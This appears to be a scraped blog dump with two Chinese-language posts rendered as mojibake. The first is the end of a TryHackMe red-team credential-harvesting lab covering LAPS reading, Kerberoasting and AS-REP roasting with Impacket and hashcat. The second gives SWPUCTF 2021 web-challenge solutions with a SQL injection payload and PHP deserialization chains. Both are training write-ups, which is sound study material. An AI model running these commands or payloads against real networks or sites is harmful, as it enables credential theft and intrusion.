ä¸Šé¢è¾“å‡ºæ˜¾ç¤ºåœ¨THMorgä¸­çš„LAPsReaderç»„å¯¹äºLAPSå…·æœ‰æ­£ç¡®çš„è®¿é—®æƒé™ï¼Œè®©æˆ‘ä»¬æ¥æ£€æŸ¥ä¸€ä¸‹è¿™ä¸ªç»„åŠå…¶æˆå‘˜ã€‚ #æŸ¥æ‰¾å±äºLAPsReaderç»„çš„ç”¨æˆ· PS C:\\Users\\thm&gt; net groups \"LAPsReader\" Group name LAPsReader Comment Members ------------------------------------------------------------------------------- bk-admin The command completed successfully. PS C:\\Users\\thm&gt; net user bk-admin User name bk-admin Full Name THM Admin BK Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 6/4/2022 10:33:48 AM Password expires Never Password changeable 6/5/2022 10:33:48 AM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 6/9/2022 3:47:28 PM Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users *Domain Admins *LAPsReader *Enterprise Admins The command completed successfully. è·å–å¯†ç  é€šè¿‡ä¸Šè¿°æšä¸¾æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°bk-adminç”¨æˆ·æ˜¯LAPsReaderç»„çš„æˆå‘˜ï¼Œå› æ­¤ä¸ºäº†è·å¾—ç›®æ ‡LAPSä¸­æ‰€å­˜å‚¨çš„å¯†ç ï¼Œæˆ‘ä»¬éœ€è¦å…¥ä¾µæˆ–å†’å……bk-adminç”¨æˆ·ã€‚åœ¨æ‰¾åˆ°æ­£ç¡®çš„ç”¨æˆ·ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å‘å¯ç”¨äº†LAPSçš„ç›®æ ‡è®¡ç®—æœºä½¿ç”¨Get-AdmPwdPasswordå‘½ä»¤æ¥è·å–LAPSä¸­æ‰€å­˜å‚¨çš„å¯†ç ã€‚ #ä½¿ç”¨æ­£ç¡®çš„ç”¨æˆ·æ¥è·å–ç›®æ ‡LAPSä¸­æ‰€å­˜å‚¨çš„å¯†ç  PS C:\\&gt; Get-AdmPwdPassword -ComputerName creds-harvestin ComputerName DistinguishedName Password ExpirationTimestamp ------------ ----------------- -------- ------------------- CREDS-HARVESTIN CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red *************** 2/11/2338 11:05:2... æ³¨æ„ï¼šåœ¨å®é™…çš„ADç¯å¢ƒä¸­ï¼ŒLAPSä»…ä¼šåœ¨ç‰¹å®šçš„è®¡ç®—æœºä¸Šè¢«å¯ç”¨ï¼›å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æšä¸¾å¹¶æ‰¾åˆ°æ­£ç¡®çš„ç›®æ ‡è®¡ç®—æœºä»¥åŠæ­£ç¡®çš„ç”¨æˆ·å¸æˆ·ï¼Œä»¥ä¾¿èƒ½å¤Ÿè·å–LAPSä¸­çš„å¯†ç ã€‚åœ¨æœ¬å°èŠ‚çš„å®éªŒç»ƒä¹ ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç›®æ ‡æœºå™¨ä¸ŠC:\\Toolç›®å½•ä¸­çš„LAPSToolkitè„šæœ¬æ¥è§£å†³ç›¸å…³çš„æšä¸¾é—®é¢˜ã€‚ tipsï¼šåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œåªæœ‰åŸŸç®¡ç†å‘˜æ‰èƒ½è¯»å–LAPSä¸­çš„å¯†ç ã€‚ ç­”é¢˜ PS C:\\&gt; Import-Module ActiveDirectory PS C:\\&gt; (Get-ADComputer $env:COMPUTERNAME -Properties *).DistinguishedName #è·å–ç›®æ ‡æœºä¿¡æ¯ PS C:\\&gt; Find-AdmPwdExtendedRights -Identity \"OU=THMorg,DC=thm,DC=red\" PS C:\\&gt; Get-AdmPwdPassword CREDS-HARVESTIN PS C:\\&gt; Get-ADGroupMember -Identity \"LAPsReader\" 0x09 å…¶ä»–ADå‡­æ®æ”¶é›†æ–¹å¼ åœ¨ä¸Šæ–‡å†…å®¹ä¸­ï¼Œæ‰€å‡è®¾çš„åœºæ™¯æ˜¯æˆ‘ä»¬å·²ç»æ‹¥æœ‰å¯¹ç›®æ ‡ç³»ç»Ÿçš„åˆå§‹è®¿é—®æƒé™ï¼Œå¹¶ä¸”å°†å°è¯•ä»Windowsæ“ä½œç³»ç»Ÿçš„å†…å­˜ä¸­æˆ–è€…å„ç§æ•æ„Ÿæ–‡ä»¶ä¸­è·å–å‡­æ®ï¼Œè€Œåœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°è¯•é’ˆå¯¹ç›®æ ‡ç½‘ç»œæ‰§è¡ŒæŸäº›æ”»å‡»ä»¥è·å–ç›¸å…³å‡­æ®ã€‚ æœ¬å°èŠ‚å°†ç®€è¦ä»‹ç»ä¸€äº›å¯ç”¨äºè·å–å¯†ç å“ˆå¸Œçš„Windowsæ”»å‡»å’ŒADæ”»å‡»ã€‚åœ¨æ·±å…¥äº†è§£æ›´å¤šå…³äºADæ”»å‡»çš„ç»†èŠ‚ä¹‹å‰ï¼Œå»ºè®®å…ˆç†Ÿæ‚‰Kerberosåè®®å’ŒNTLM(æ–°æŠ€æœ¯LANç®¡ç†å™¨-New Technology LAN Manager)ï¼Œè¿™æ˜¯ä¸€å¥—ç”¨äºå¯¹è®¡ç®—æœºç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯çš„å®‰å…¨åè®®ã€‚ Kerberoastingæ”»å‡» Kerberoastingæ˜¯ä¸€ç§å¸¸è§çš„ADæ”»å‡»ï¼Œå¯ç”¨äºè·å–ADç¥¨æ®ï¼Œä»è€Œå¸®åŠ©æ”»å‡»è€…å®ç°æƒé™ç»´æŒã€‚ ä¸ºäº†æœ‰æ•ˆåœ°æ‰§è¡Œè¿™ç§æ”»å‡»ï¼Œæ”»å‡»è€…å¿…é¡»èƒ½å¤Ÿè®¿é—®SPN(æœåŠ¡ä¸»ä½“åç§°)å¸æˆ·ï¼Œå¦‚IISç”¨æˆ·ã€MSSQLç­‰ã€‚Kerberoastingæ”»å‡»ä¸»è¦æ¶‰åŠè¯·æ±‚ç¥¨æ®æˆäºˆç¥¨æ®(TGT)å’Œç¥¨æ®æˆäºˆæœåŠ¡(TGS)ï¼Œè¿™ç§æ”»å‡»çš„æœ€ç»ˆç›®æ ‡æ˜¯å®ç°æƒé™æå‡å’Œå†…ç½‘æ¨ªå‘ç§»åŠ¨ã€‚ æœ‰å…³è¯¥æ”»å‡»çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å°è¯•é˜…è¯»ä»¥ä¸‹åšå®¢å†…å®¹ï¼š ã€THMã€‘Persisting Active Directory(ADåŸŸæƒé™ç»´æŒ)-çº¢é˜Ÿ ç°åœ¨è®©æˆ‘ä»¬æ¥å¿«é€Ÿæ¼”ç¤ºä¸€ä¸‹æ­¤ç±»æ”»å‡»ï¼šé¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ç›®æ ‡åŸŸæ§åˆ¶å™¨çš„ä¸€ä¸ªSPNå¸æˆ·ï¼Œç„¶åæˆ‘ä»¬å†å‘é€è¯·æ±‚ä»¥è·å¾—TGSç¥¨æ®ã€‚ å¦‚ä»¥ä¸‹å‘½ä»¤æ‰€ç¤ºï¼Œæˆ‘ä»¬å°†åœ¨æ”»å‡»æœºä¸Šä½¿ç”¨GetUserSPNs.pyè„šæœ¬æ¥é’ˆå¯¹ç›®æ ‡æœºå™¨æšä¸¾SPNå¸æˆ·ã€‚ tipsï¼šåœ¨æœ¬æ–‡çš„ç›¸å…³å®éªŒä¸­ï¼Œæˆ‘ä»¬æ‰€é’ˆå¯¹çš„ç›®æ ‡å¸æˆ·æ˜¯THM.red/thmï¼Œå®ƒçš„å¯†ç ä¸ºPassw0rd!ã€‚ #æšä¸¾SPNå¸æˆ· #python3 /impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm python3 ./impacket/examples/GetUserSPNs.py -dc-ip 10.10.192.231 THM.red/thm #Passwordï¼šPassw0rd! Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ---------------------------- ------- -------- -------------------------- --------- ---------- http/creds-harvestin.thm.red svc-thm 2022-06-10 17:47:33.796826 &lt;never&gt; ç›®æ ‡åŸŸæ§åˆ¶å™¨çš„æœåŠ¡ä¸»ä½“åç§°(Service Principal Name-SPN)æ˜¯ï¼šsvc-thm ä¸Šé¢çš„å‘½ä»¤å¾ˆç®€å•ï¼šæˆ‘ä»¬åªéœ€è¦æä¾›ç›®æ ‡åŸŸæ§åˆ¶å™¨çš„IPåœ°å€å’Œç›¸å…³çš„domain name\\user nameï¼Œç„¶åGetUserSPNsè„šæœ¬å°±ä¼šè¯·æ±‚æˆ‘ä»¬è¾“å…¥ç”¨æˆ·å¯†ç ä»¥æ£€ç´¢æˆ‘ä»¬æ‰€æƒ³è¦è·å–çš„ä¿¡æ¯ã€‚ ä¸Šé¢çš„è¾“å‡ºç»“æœæ˜¾ç¤ºäº†ä¸€ä¸ªåä¸ºsvc-thmçš„SPNå¸æˆ·ï¼Œåœ¨æ‰¾åˆ°è¯¥SPNç”¨æˆ·ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨-request-userå‚æ•°æ¥å‘é€å•ä¸ªè¯·æ±‚ï¼Œä»è€Œä¸ºsrv-userç”¨æˆ·è·å–TGSç¥¨æ®ã€‚ #è¯·æ±‚ä¸€ä¸ªä½œä¸ºSPNå¸æˆ·çš„TGSç¥¨æ® #æ­¤å¤„å¯èƒ½éœ€è¦ä¿®æ”¹æ”»å‡»æœºä¸Šçš„hostæ–‡ä»¶ï¼š10.10.192.231 THM.red svc-thm.THM.red python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm -request-user svc-thm python3 ./impacket/examples/GetUserSPNs.py -dc-ip 10.10.192.231 THM.red/thm -request-user svc-thm #Passwordï¼šPassw0rd! ç„¶åï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨HashCatå·¥å…·ä¸­çš„-m 13100æ¨¡å¼æ¥ç ´è§£æˆ‘ä»¬å·²ç»è·å–çš„TGSç¥¨æ®ï¼š #ä½¿ç”¨Hashcatç ´è§£TGSç¥¨æ® vim spn.hash hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt æ‰§è¡ŒKerberoastingæ”»å‡»ä»¥è·å–TGSç¥¨æ®ï¼Œç„¶åç ´è§£TGSç¥¨æ®ï¼Œæˆ‘ä»¬æœ€ç»ˆå¾—åˆ°çš„æ˜æ–‡å¯†ç ä¸ºï¼šPassw0rd1 AS-REP Roastingæ”»å‡» AS-REP RoastingæŠ€æœ¯å°†ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿæ£€ç´¢å¸æˆ·é€‰é¡¹è¢«è®¾ç½®ä¸ºâ€œä¸éœ€è¦Kerberosé¢„è®¤è¯â€çš„ADç”¨æˆ·çš„å¯†ç å“ˆå¸Œï¼Œæ­¤å¸æˆ·é€‰é¡¹ä¾èµ–äºæ—§çš„Kerberosèº«ä»½éªŒè¯åè®®ï¼Œå®ƒèƒ½å¤Ÿå…è®¸åœ¨æ²¡æœ‰å¯†ç çš„æƒ…å†µä¸‹è¿›è¡Œèº«ä»½éªŒè¯ã€‚ä¸€æ—¦æˆ‘ä»¬é€šè¿‡AS-REP RoastingæŠ€æœ¯è·å¾—ç”¨æˆ·çš„å“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•è¿›è¡Œç¦»çº¿ç ´è§£ï¼Œå¦‚æœç›¸å…³çš„å“ˆå¸Œå€¼æ˜¯å¯ç ´è§£çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¤ŸæˆåŠŸå¾—åˆ°ä¸€ä¸ªæ˜æ–‡çš„ç”¨æˆ·å¯†ç ã€‚ åœ¨æ‰§è¡ŒAS-REP Roastingä¹‹å‰ï¼Œæˆ‘ä»¬é€šå¸¸è¿˜éœ€è¦æ‰§è¡Œæšä¸¾æ­¥éª¤ä»¥æ”¶é›†ç›¸å…³çš„ç›®æ ‡åŸŸå¸æˆ·åˆ—è¡¨ï¼Œåœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†åœ¨æ”»å‡»æœºä¸­çš„TMPç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªç°æˆçš„å…³äºç›®æ ‡ç½‘ç»œçš„åŸŸå¸æˆ·åˆ—è¡¨-users.txtï¼Œä¸‹é¢æ˜¯è¯¥åˆ—è¡¨çš„å†…å®¹(åœ¨å®é™…æƒ…å†µä¸‹è¯¥åˆ—è¡¨åº”è¯¥é€šè¿‡ä¿¡æ¯æšä¸¾è·å¾—)ã€‚ Administrator admin thm test sshd victim CREDS-HARVESTIN$ æ³¨æ„ï¼šåœ¨æœ¬æ–‡ç›¸å…³çš„å®éªŒç¯å¢ƒä¸­å­˜åœ¨é…ç½®äº†â€œä¸éœ€è¦Kerberosé¢„è®¤è¯â€çš„ADç”¨æˆ·ï¼Œå› æ­¤æˆ‘ä»¬èƒ½å¤Ÿå°è¯•é’ˆå¯¹ç›®æ ‡æœºå™¨æ‰§è¡ŒAS-REP Roastingã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨Impacketä¸­çš„Get-NPUsersè„šæœ¬ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š #å¯¹ç›®æ ‡ç”¨æˆ·åˆ—è¡¨æ‰§è¡ŒAS-REP Roastingæ”»å‡» python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip MACHINE_IP thm.red/ -usersfile /tmp/users.txt python3 ./impacket/examples/GetNPUsers.py -dc-ip 10.10.192.231 thm.red/ -usersfile /tmp/users.txt åœ¨ä¸Šè¿°å‘½ä»¤ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†-dc-ipå‚æ•°æ¥æŒ‡å®šç›®æ ‡åŸŸæ§åˆ¶å™¨çš„IPåœ°å€ï¼Œå¹¶ä¸”ä¸ºè„šæœ¬æä¾›äº†ä¸€ä¸ªå¯ä¾›æ£€æŸ¥çš„åŸŸç”¨æˆ·åˆ—è¡¨ï¼Œä¸€æ—¦GetNPUsers.pyè„šæœ¬åœ¨æ‰§è¡Œæ—¶æ‰¾åˆ°äº†æ²¡æœ‰Kerberosé¢„è®¤è¯é…ç½®çš„æ­£ç¡®ç”¨æˆ·ï¼Œé‚£ä¹ˆæ­¤è„šæœ¬å°±ä¼šä¸ºæˆ‘ä»¬ç”Ÿæˆç›¸å…³çš„ç¥¨æ®ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Impacket GetNPUsersè„šæœ¬çš„-formatå‚æ•°å°†ç¥¨æ®å¯¼å‡ºä¸ºé€‚é…Johnæˆ–è€…hashcatçš„æ ¼å¼ï¼Œç„¶åå†ä½¿ç”¨Rubeuså’ŒHashcatç­‰å·¥å…·æ¥å°è¯•ç ´è§£æˆ‘ä»¬ä»ç›®æ ‡Active Directoryç¯å¢ƒä¸­æ‰€è·å–çš„TGTsã€‚ æœ‰å…³AS-REP Roastingæ”»å‡»çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å°è¯•é˜…è¯»ä»¥ä¸‹åšå®¢å†…å®¹ï¼š ã€THMã€‘Attacktive Directory(ADåŸŸæ¸—é€åŸºç¡€)-ç»ƒä¹  ã€THMã€‘Attacking Kerberos(Kerberosæ¸—é€åŸºç¡€)-å­¦ä¹  SMB Relay Attack(SMBä¸­ç»§æ”»å‡») SMB Relayæ”»å‡»çš„åŸç†æ˜¯æ»¥ç”¨NTLMè®¤è¯æœºåˆ¶(NTLMè´¨è¯¢-å“åº”åè®®)ï¼Œæ”»å‡»è€…ä¼šé€šè¿‡æ‰§è¡Œä¸­é—´äººæ”»å‡»æ¥ç›‘æ§å’Œæ•è·SMBæŠ¥æ–‡å¹¶æå–å“ˆå¸Œå€¼ã€‚ä¸ºäº†ä½¿è¿™ç§æ”»å‡»ç”Ÿæ•ˆï¼Œæ”»å‡»è€…è¿˜å¿…é¡»ç¡®ä¿ç›®æ ‡æœºå™¨çš„SMBç­¾åå·²ç»è¢«ç¦ç”¨ï¼ŒSMBç­¾åæ˜¯ä¸€ç§é’ˆå¯¹ä¿¡æ¯å®Œæ•´æ€§çš„å®‰å…¨æ£€æŸ¥ï¼Œå¯ç”¨äºç¡®ä¿é€šä¿¡åœ¨å—ä¿¡ä»»çš„æº(å®¢æˆ·ç«¯ã€æœåŠ¡ç«¯)ä¹‹é—´è¿›è¡Œã€‚ æœ‰å…³SMBä¸­ç»§æ”»å‡»çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å°è¯•é˜…è¯»ä»¥ä¸‹åšå®¢å†…å®¹ï¼š ã€THMã€‘Exploiting Active Directory(åˆ©ç”¨ADåŸŸé”™è¯¯é…ç½®)-çº¢é˜Ÿ LLMNR/NBNSæŠ•æ¯’æ”»å‡» LLMNR (Link-Local Multicast Name Resolution-é“¾è·¯æœ¬åœ°ç»„æ’­åç§°è§£æ)å’ŒNBT-NS (NetBIOS Name Service-NetBIOSåç§°æœåŠ¡)å¯ä»¥å¸®åŠ©æœ¬åœ°ç½‘ç»œä¸­çš„è®¡ç®—æœºåœ¨DNSæŸ¥è¯¢å¤±è´¥æ—¶æ‰¾åˆ°æ­£ç¡®çš„æœºå™¨ï¼›ä¾‹å¦‚ï¼Œå‡è®¾æŸç½‘ç»œä¸­çš„ä¸€å°æœºå™¨æƒ³è¦åœ¨æ²¡æœ‰ç°æœ‰çš„DNSè®°å½•çš„æƒ…å†µä¸‹è¿›è¡Œé€šä¿¡(å³DNSè§£æå¤±è´¥)ï¼Œé‚£ä¹ˆè¯¥æœºå™¨å°±å¯ä»¥é€šè¿‡LLMNRæˆ–è€…NBT-NSå‘æ‰€æœ‰æœ¬åœ°ç½‘ç»œä¸­çš„å…¶ä»–æœºå™¨å‘é€å¤šæ’­æ¶ˆæ¯ï¼Œä»¥è¯·æ±‚è·å–æ­£ç¡®çš„åœ°å€ã€‚ LLMNR/NBNSæŠ•æ¯’æ”»å‡»å‘ç”Ÿåœ¨æ”»å‡»è€…è¯•å›¾æ¬ºéª—ç›®æ ‡ç½‘ç»œä¸Šçš„æƒå¨æºï¼Œå¹¶ä½¿ç”¨ä¸»æœºæ ‡è¯†æœåŠ¡å¯¹è¯·æ±‚ä¸»æœºçš„é“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æ(LLMNR)å’ŒNetBIOSåç§°æœåŠ¡(NBT-NS)çš„æµé‡è¿›è¡Œå“åº”æ—¶ã€‚å¦‚æœæƒ³äº†è§£æ›´å¤šæœ‰å…³æ­¤ç±»æ”»å‡»çš„ä¿¡æ¯ï¼Œå»ºè®®æŸ¥çœ‹ä»¥ä¸‹åšå®¢å†…å®¹ï¼š ã€THMã€‘Breaching Active Directory(å…¥ä¾µæ´»åŠ¨ç›®å½•)-çº¢é˜Ÿ SMBä¸­ç»§æ”»å‡»å’ŒLLMNR/NBNSæŠ•æ¯’æ”»å‡»çš„æœ€ç»ˆç›®æ ‡éƒ½æ˜¯ä¸ºäº†æ•è·ç›®æ ‡ç”¨æˆ·ç”¨äºèº«ä»½éªŒè¯çš„NTLMå“ˆå¸Œï¼Œè¿™æœ‰åŠ©äºæˆ‘ä»¬è·å¾—å¯¹äºç›®æ ‡å¸æˆ·æˆ–è€…ç›®æ ‡æœºå™¨çš„è®¿é—®æƒé™ã€‚ 0x10 æ€»ç»“ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬è®¨è®ºäº†æ”»å‡»è€…ç”¨äºè·å–ç”¨æˆ·å‡­æ®çš„å„ç§æ–¹æ³•ï¼ŒåŒ…æ‹¬ä»æœ¬åœ°è®¡ç®—æœºå’ŒåŸŸæ§åˆ¶å™¨ä¸­è·å–å‡­æ®ï¼Œæ€»ç»“å¦‚ä¸‹ï¼š æˆ‘ä»¬è®¨è®ºäº†å¦‚ä½•è®¿é—®Windowså†…å­˜ã€è½¬å‚¨LSASSè¿›ç¨‹å¹¶æå–ç”¨äºèº«ä»½éªŒè¯çš„å“ˆå¸Œå€¼ã€‚ æˆ‘ä»¬è®¨è®ºäº†Windowså‡­æ®ç®¡ç†å™¨ä»¥åŠä»ä¸­æå–å¯†ç ä¿¡æ¯çš„æ–¹æ³•ã€‚ æˆ‘ä»¬ä»‹ç»äº†Windows LAPSç‰¹æ€§ï¼Œå¹¶é€šè¿‡æšä¸¾å®ƒæ¥æ‰¾åˆ°æ­£ç¡®çš„ç”¨æˆ·å’Œç›®æ ‡ä»è€Œå°è¯•æå–ç›¸å…³çš„å¯†ç ä¿¡æ¯ã€‚ æˆ‘ä»¬ä»‹ç»äº†èƒ½å¤Ÿç”¨äºå®ç°è½¬å‚¨å’Œæå–ç”¨æˆ·å‡­æ®çš„ADæ”»å‡»ã€‚ ä»¥ä¸‹å·¥å…·å¯ç”¨äºæ‰«æç›®æ ‡è®¡ç®—æœº(æ¢æµ‹æ–‡ä»¶ã€å†…å­˜ç­‰)ä»¥æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯ï¼Œå»ºè®®åœ¨è¿›è¡Œä¿¡æ¯æšä¸¾æ—¶ä½¿ç”¨ï¼š Snaffler Seatbelt Lazagne","tags":["TryHackMe"],"categories":["TryHackMe"]},{"path":"/2024/03/03/swpuctf/","content":"[SWPUCTF 2021 æ–°ç”Ÿèµ›]gift_F12 ç®€å•çš„jsæºç æ³„éœ² [SWPUCTF 2021 æ–°ç”Ÿèµ›]jicao &lt;?php highlight_file('index.php'); include(\"flag.php\"); $id=$_POST['id']; $json=json_decode($_GET['json'],true); if ($id==\"wllmNB\"&amp;&amp;$json['x']==\"wllm\") {echo $flag;} ?&gt; åªéœ€è¦id=wllmNB,éšågetä¼ å‚?json={\"x\":\"wllm\"} ä½†è¿™é‡Œå¦‚æœç”¨bpçš„è¯ï¼Œéœ€è¦æ·»åŠ Content-Type: application/x-www-form-**urlencodedæ‰å¯ä»¥ å› ä¸ºæœ‰postä¼ å‚ï¼Œå› æ­¤å¿…é¡»è¿›è¡Œurlç¼–ç  [SWPUCTF 2021 æ–°ç”Ÿèµ›]easy_md5 &lt;?php highlight_file(__FILE__); include 'flag2.php'; if (isset($_GET['name']) &amp;&amp; isset($_POST['password'])){ $name = $_GET['name']; $password = $_POST['password']; if ($name != $password &amp;&amp; md5($name) == md5($password)){ echo $flag; } else { echo \"wrong!\"; } } else { echo 'wrong!'; } ?&gt; wrong! [SWPUCTF 2021 æ–°ç”Ÿèµ›]include é¡µé¢è¯´è®©æˆ‘ä»¬ä¸²fileå‚æ•°è¯•è¯•ï¼Œä¼ å…¥ä¹‹åçŸ¥é“æ˜¯ä¼ªåè®®è¯»å– &lt;?php ini_set(\"allow_url_include\",\"on\"); header(\"Content-type: text/html; charset=utf-8\"); error_reporting(0); $file=$_GET['file']; if(isset($file)){ show_source(__FILE__); echo 'flag åœ¨flag.phpä¸­'; }else{ echo \"ä¼ å…¥ä¸€ä¸ªfileè¯•è¯•\"; } echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; include_once($file); ?&gt; flag åœ¨flag.phpä¸­ [SWPUCTF 2021 æ–°ç”Ÿèµ›]easy_sql ç®€å•SQLæ³¨å…¥ ?wllm=-1' union select 1, group_concat(flag), 3 from test_tb--+ [SWPUCTF 2021 æ–°ç”Ÿèµ›]easyrce [SWPUCTF 2021 æ–°ç”Ÿèµ›]caidao RCEæˆ–è€…èšå‰‘è¿æ¥ ä¸è¿‡è¿™é‡Œèšå‰‘è¿æ¥æ—¶å€™æ€»æ˜¯æŠ¥é”™ï¼Œä¹‹åä¿®æ”¹äº†ç¼–ç æ–¹å¼æ‰é€šè¿‡ã€‚ä¸ç†è§£ï¼ˆè¢«wafäº†ï¼Ÿï¼Ÿï¼Ÿï¼‰ [SWPUCTF 2021 æ–°ç”Ÿèµ›]Do_you_know_http ç¬¬ä¸€ä¸ªæ”¹UAå¤´å³å¯ï¼Œç¬¬äºŒä¸ªæ”¹IPä¸ºæœ¬åœ°ï¼Œ302è·³è½¬å³å¯ [ç¬¬äº”ç©ºé—´ 2021]WebFTP ä¸çŸ¥é“è€ƒä»€ä¹ˆï¼Œç›´æ¥æ‰«ç›®å½•å¾—åˆ°phpinfo.phpï¼Œæœç´¢flagå³å¯ [SWPUCTF 2021 æ–°ç”Ÿèµ›]babyrce &lt;?php error_reporting(0); highlight_file(__FILE__); error_reporting(0); if (isset($_GET['url'])) { $ip=$_GET['url']; if(preg_match(\"/ /\", $ip)){ die('nonono'); } $a = shell_exec($ip); echo $a; } ?&gt; [SWPUCTF 2021 æ–°ç”Ÿèµ›]ez_unserialize &lt;?php error_reporting(0); show_source(\"cl45s.php\"); class wllm{ public $admin; public $passwd; public function __construct(){ $this-&gt;admin =\"user\"; $this-&gt;passwd = \"123456\"; } public function __destruct(){ if($this-&gt;admin === \"admin\" &amp;&amp; $this-&gt;passwd === \"ctf\"){ include(\"flag.php\"); echo $flag; }else{ echo $this-&gt;admin; echo $this-&gt;passwd; echo \"Just a bit more!\"; } } } $p = $_GET['p']; unserialize($p); ?&gt; é“¾å­å¦‚ä¸‹ï¼š &lt;?php class wllm{ public $admin; public $passwd; } $pop=new wllm(); $pop-&gt;admin = 'admin'; $pop-&gt;passwd = 'ctf'; echo urlencode(serialize($pop)); ?&gt; è¿™é‡Œæ”¾ä¸€ä¸ªå¯¹ä¸Šè¿°æ„é€ å‡½æ•°ä»¥åŠååºåˆ—åŒ–çš„ä¼˜å…ˆçº§è§£é‡Šï¼ˆæˆ‘æ„Ÿè§‰GPTå›ç­”æ²¡é”™ï¼‰ åœ¨ PHP çš„åºåˆ—åŒ–ä¸­ï¼Œå¦‚æœåœ¨åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­æŒ‡å®šäº†å¯¹è±¡çš„å±æ€§å€¼ï¼Œé‚£ä¹ˆåœ¨ååºåˆ—åŒ–æ—¶ï¼Œä¼šä½¿ç”¨è¿™äº›æŒ‡å®šçš„å±æ€§å€¼æ¥åˆå§‹åŒ–å¯¹è±¡ï¼Œè€Œä¸ä¼šè°ƒç”¨æ„é€ å‡½æ•°ã€‚å› æ­¤ï¼Œåœ¨ä¼ å…¥åºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶ï¼Œä½ å¯ä»¥è¿™æ ·æŒ‡å®š admin å’Œ passwd çš„å€¼ï¼š O:4:\"wllm\":2:{s:5:\"admin\";s:4:\"user\";s:6:\"passwd\";s:6:\"123456\";} è¿™é‡Œçš„ä¼˜å…ˆçº§æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å±æ€§å€¼ä¼˜å…ˆäºæ„é€ å‡½æ•°ä¸­çš„é»˜è®¤å€¼ã€‚ååºåˆ—åŒ–æ—¶ä¼šä½¿ç”¨è¿™äº›æŒ‡å®šçš„å±æ€§å€¼æ¥åˆå§‹åŒ–å¯¹è±¡çš„å±æ€§ã€‚ [SWPUCTF 2021 æ–°ç”Ÿèµ›]easyupload2.0 è¿™é“é¢˜ä¹Ÿæ˜¯æ²¡æƒ³åˆ°ï¼Œå› ä¸ºåŸºæœ¬æ²¡è§è¿‡ï¼ˆä½†ç¡®å®åŸºç¡€ã€‚ã€‚ã€‚ï¼‰ è¿™é‡Œä¸Šä¼ è¯•äº†å‡ æ¬¡å‘ç°banäº†phpã€iniã€htaccessï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘PHPæ–‡ä»¶å…¶ä»–çš„æ‹“å±•åphp3ã€php5ã€phtmlã€phtç­‰æˆ‘ä»¬ä¸€ä¸€å°è¯• æ‰¾ç¯å¢ƒå˜é‡æˆ–è€…phpinfoéƒ½å¯ [SWPUCTF 2021 æ–°ç”Ÿèµ›]easyupload1.0 å‘ç°ä¿®æ”¹ä¸ºè¯¥MIMEç±»å‹å³å¯ [SWPUCTF 2021 æ–°ç”Ÿèµ›]no_wakeup &lt;?php header(\"Content-type:text/html;charset=utf-8\"); error_reporting(0); show_source(\"class.php\"); class HaHaHa{ public $admin; public $passwd; public function __construct(){ $this-&gt;admin =\"user\"; $this-&gt;passwd = \"123456\"; } public function __wakeup(){ $this-&gt;passwd = sha1($this-&gt;passwd); } public function __destruct(){ if($this-&gt;admin === \"admin\" &amp;&amp; $this-&gt;passwd === \"wllm\"){ include(\"flag.php\"); echo $flag; }else{ echo $this-&gt;passwd; echo \"No wake up\"; } } } $Letmeseesee = $_GET['p']; unserialize($Letmeseesee); ?&gt; &lt;?php class HaHaHa{ public $admin; public $passwd; } $pop=new HaHaHa(); $pop-&gt;admin = 'admin'; $pop-&gt;passwd = 'wllm'; echo serialize($pop); ?&gt; O:6:\"HaHaHa\":6:{s:5:\"admin\";s:5:\"admin\";s:6:\"passwd\";s:4:\"wllm\";}//ä¿®æ”¹å±æ€§ä¸ªæ•°å³å¯ [SWPUCTF 2021 æ–°ç”Ÿèµ›]PseudoProtocols çœ‹äº†æç¤ºæ‰æƒ³åˆ°ä¼ªåè®® &lt;?php ini_set(\"max_execution_time\", \"180\"); show_source(__FILE__); include('flag.php'); $a= $_GET[\"a\"]; if(isset($a)&amp;&amp;(file_get_contents($a,'r')) === 'I want flag'){ echo \"success \"; echo $flag; } ?&gt; 